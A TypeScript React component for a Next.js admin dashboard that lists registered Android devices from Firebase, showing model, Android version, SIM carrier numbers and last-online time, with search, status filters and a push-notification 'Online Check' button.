"use client";
import { useEffect, useMemo, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Button, Card, CardBody, Input, Skeleton } from "@heroui/react";
import { db } from "@/lib/firbase";
import { ref, update } from "firebase/database";
import Devices from "@/types/devicetype";
import type { DeviceStatus } from "@/lib/deviceStatus";
import PageDropdown from "@/components/PageDropdown";

type DeviceTableProps = {
  devices: Devices[];
};

function formatTimeAgo(value: string, nowTimestamp: number) {
  const timestamp = Date.parse(value);

  if (Number.isNaN(timestamp)) {
    return "N/A";
  }

  const diffMs = nowTimestamp - timestamp;

  if (diffMs <= 0) {
    return "0 min ago";
  }

  const totalMinutes = Math.floor(diffMs / (60 * 1000));

  const days = Math.floor(totalMinutes / (60 * 24));
  const hours = Math.floor((totalMinutes % (60 * 24)) / 60);
  const minutes = totalMinutes % 60;

  const parts = [];

  if (days > 0) parts.push(`${days} day${days > 1 ? "s" : ""}`);
  if (hours > 0) parts.push(`${hours} hr${hours > 1 ? "s" : ""}`);
  if (minutes > 0) parts.push(`${minutes} min`);

  return parts.join(" ") + " ago";
}

function compareDeviceSerialDesc(a: Devices, b: Devices) {
  return b.deviceId.localeCompare(a.deviceId, undefined, {
    numeric: true,
    sensitivity: "base",
  });
}

const SearchIcon = () => (
  <svg
    className="h-4 w-4 text-slate-500"
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth="1.8"
      d="m21 21-4.2-4.2m1.2-4.8a6 6 0 1 1-12 0 6 6 0 0 1 12 0Z"
    />
  </svg>
);

function formatSmartTime(value: number | string) {
  const timestamp = new Date(value).getTime();
  console.log("Parsed timestamp:", timestamp);

  if (isNaN(timestamp)) return "N/A";
  if (timestamp <= 0) return "Just now";
  console.log("Current time:", Date.now(), "Input time:", timestamp);

  const now = Date.now();
  const diffMs = now - timestamp;

  if (diffMs <= 0) return "Just now";

  const minutes = Math.floor(diffMs / (60 * 1000));
  const hours = Math.floor(diffMs / (60 * 60 * 1000));
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000));

  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;

  return "Just now";
}

export default function DeviceTable({ devices }: DeviceTableProps) {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [searchQuery, setSearchQuery] = useState("");
  const [statusFilter, setStatusFilter] = useState<"all" | DeviceStatus>("all");
  const [isLoading, setIsLoading] = useState(true);
  const [nowTimestamp, setNowTimestamp] = useState(() => Date.now());
  const [checkingIds, setCheckingIds] = useState<Set<string>>(new Set());
  const [smsLoadingIds, setSmsLoadingIds] = useState<Set<string>>(new Set())
  const [isCheckingAll, setIsCheckingAll] = useState(false); // Keeping this as it is used
  const [favoriteUpdatingIds, setFavoriteUpdatingIds] = useState<Set<string>>(new Set()); // Keeping this as it is used

  async function checkStatus(deviceId: string, fcmToken: string) {
    setCheckingIds((prev) => new Set(prev).add(deviceId));

    try {
      const response = await fetch("/api/checkstatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId,
          token: fcmToken,
          title: "Status Check",
          body: "Checking device status, please wait...",
        }),
      });

      const result = await response.json();

      if (!result.success) {
        console.error("Failed to check status:", result.error);
      }
    } catch (error) {
      console.error("Error while checking status:", error);
    } finally {
      setCheckingIds((prev) => {
        const next = new Set(prev);
        next.delete(deviceId);
        return next;
      });
    }
  }

  async function checkAllStatus() {
    setIsCheckingAll(true);

    try {
      const response = await fetch("/api/checkstatus-all", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          title: "Status Check",
          body: "Checking device status, please wait...",
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        console.error("Failed to check all statuses:", result.error ?? result);
        return;
      }

      if (!result.success && result.notificationSent > 0) {
        console.warn("Check status partially completed:", result);
        return;
      }

      if (!result.success) {
        console.warn(
          "Check status request did not complete:",
          result.error ?? result,
        );
      }
    } catch (error) {
      console.error("Error while checking all statuses:", error);
    } finally {
      setIsCheckingAll(false);
    }
  }

  async function toggleFavorite(deviceId: string, currentValue: boolean) {
    setFavoriteUpdatingIds((prev) => new Set(prev).add(deviceId));

    try {
      const deviceRef = ref(db, `registeredDevices/${deviceId}`);
      await update(deviceRef, { isfavorite: !currentValue });
    } catch (error) {
      console.error("Failed to update favorite state", error);
    } finally {
      setFavoriteUpdatingIds((prev) => {
        const next = new Set(prev);
        next.delete(deviceId);
        return next;
      });
    }
  }

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 500);

    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const intervalId = window.setInterval(() => {
      setNowTimestamp(Date.now());
    }, 60 * 1000);

    return () => {
      window.clearInterval(intervalId);
    };
  }, []);

  useEffect(() => {
    const queryStatus = searchParams.get("status")?.toLowerCase();

    if (queryStatus === "online" || queryStatus === "offline") {
      setStatusFilter(queryStatus);
      return;
    }

    setStatusFilter("all");
  }, [searchParams]);

  const rankedDevices = useMemo(() => {
    const query = searchQuery.trim().toLowerCase();

    const matchedDevices = devices.filter((device) => {
      const matchesStatus =
        statusFilter === "all" ||
        device.onlineStatus === statusFilter ||
        (statusFilter === "offline" && device.onlineStatus === "uninstalled");
      const matchesQuery =
        query.length === 0 ||
        device.deviceId.toLowerCase().includes(query) ||
        device.model.toLowerCase().includes(query) ||
        device.brand.toLowerCase().includes(query) ||
        device.androidVersion.toLowerCase().includes(query);

      return matchesStatus && matchesQuery;
    });

    const serialDescending = matchedDevices
      .slice()
      .sort(compareDeviceSerialDesc);

    return serialDescending.map((device, index) => ({
      device,
      serialNumber: serialDescending.length - index,
    }));
  }, [devices, searchQuery, statusFilter]);

  const onlineCount = useMemo(
    () => devices.filter((device) => device.onlineStatus === "online").length,
    [devices],
  );
  const offlineCount = Math.max(devices.length - onlineCount, 0);

  if (isLoading) {
    return (
      <Card className="surface-card">
        <CardBody className="space-y-3">
          {Array.from({ length: 6 }).map((_, index) => (
            <Skeleton key={index} className="h-10 w-full rounded-lg" />
          ))}
        </CardBody>
      </Card>
    );
  }

  return (
    <>
      <Card className="border border-(--border) bg-white shadow-none">
        <CardBody className="space-y-4 p-3 sm:p-4">
          <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
            <div className="flex flex-row items-center ">
              <PageDropdown />
              <Input
                value={searchQuery}
                onValueChange={setSearchQuery}
                placeholder="Search devices"
                startContent={<SearchIcon />}
                className="w-full min-w-52 sm:w-72"
                classNames={{
                  inputWrapper:
                    "h-9 rounded-sm border border-(--border) bg-white px-3 text-sm",
                }}
              />
            
            </div>
          </div>
        </CardBody>
      </Card>

      <Card className="border border-(--border) bg-white shadow-none">
        <CardBody className="p-3 sm:p-4">
          <div className="text-sm text-(--text-muted)">
            Showing {rankedDevices.length} device
            {rankedDevices.length === 1 ? "" : "s"}
          </div>

          {rankedDevices.length === 0 ? (
            <div className="rounded-[28px] border border-dashed border-(--border-strong) bg-(--surface-subtle) px-6 py-12 text-center">
              <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-white text-(--accent) shadow-(--shadow-xs)">
                <SearchIcon />
              </div>
              <p className="mt-4 text-base font-medium text-(--text-main)">
                No devices found
              </p>
              <p className="mt-1 text-sm text-(--text-muted)">
                Try clearing the filters or searching with a different keyword.
              </p>
            </div>
          ) : (
            <div
              className="grid grid-cols-2 gap-3 sm:grid-cols-2 xl:grid-cols-3"
              role="list"
              aria-label="Devices list for admin monitoring"
            >
              {rankedDevices.map(({ device, serialNumber }) => {
                return (
                  <div
                    key={device.deviceId}
                    className="cursor-pointer rounded-sm border border-(--border) bg-white p-3 text-sm transition-colors hover:border-(--border-strong)"
                    role="listitem"
                    onClick={() =>
                      router.push(
                        `/devices/${encodeURIComponent(device.deviceId)}`,
                      )
                    }
                  >
                    <div className="flex items-start justify-between gap-3">
                      <div className="space-y-1">
                        <p className="text-sm font-semibold text-(--text-main)">
                          {serialNumber}. {device.brand} ({device.model})
                        </p>
                      </div>
                    </div>
                    <div className="mt-2 ">
                      <div className="flex justify-between border-l-1 border-r-1 border-t-1 border-black pl-2 pr-2 pt-1 pb-1">
                        <span className="text-sm text-(--text-muted)">ID:</span>
                        <span className="text-sm font-medium text-(--text-main) break-all">
                          {device.deviceId}
                        </span>
                      </div>
                      <div className="flex justify-between border-l-1 border-r-1 border-t-1 border-black pl-2 pr-2 pt-1 pb-1">
                        <span className="text-sm text-(--text-muted)">
                          Android:
                        </span>
                        <span className="text-sm font-medium text-(--text-main)">
                          {device.androidVersion}
                        </span>
                      </div>
                      {device.sim1Carrier !== "Unknown" && (
                        <div className="flex justify-between border-l-1 border-r-1 border-t-1 border-black pl-2 pr-2 pt-1 pb-1">
                          <span className="text-sm font-medium text-(--text-main)">
                            sim1: {" " + device.sim1Carrier} {device.sim1number}
                          </span>
                        </div>
                      )}
                      {device.sim2Carrier !== "Unknown" && (
                        <div className="flex justify-between  border-l-1 border-r-1 border-t-1 border-black pl-2 pr-2 pt-1 pb-1">
                          <span className="text-sm font-medium text-(--text-main)">
                            sim2: {" " + device.sim2Carrier} {device.sim2number}
                          </span>
                        </div>
                      )}
                      <div className="flex justify-between border-1 border-black pl-2 pr-2 pt-1 pb-1">
                        <span className="text-sm text-(--text-muted)">
                          Online:
                        </span>
                        <span className={`text-sm font-medium text-red-600`}>
                          {formatSmartTime(device.lastChecked)}
                        </span>
                      </div>
                    </div>

                    <div className="mt-3 flex">
                      <Button
                        size="sm"
                        radius="sm"
                        variant="flat"
                        className="h-10 w-full border border-black bg-white text-(--text-main) shadow-none"
                        isLoading={checkingIds.has(device.deviceId)}
                        onClick={(event) => event.stopPropagation()}
                        onPress={() =>
                          checkStatus(device.deviceId, device.fcmToken)
                        }
                      >
                        Online Check
                      </Button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </CardBody>
      </Card>
    </>
  );
}
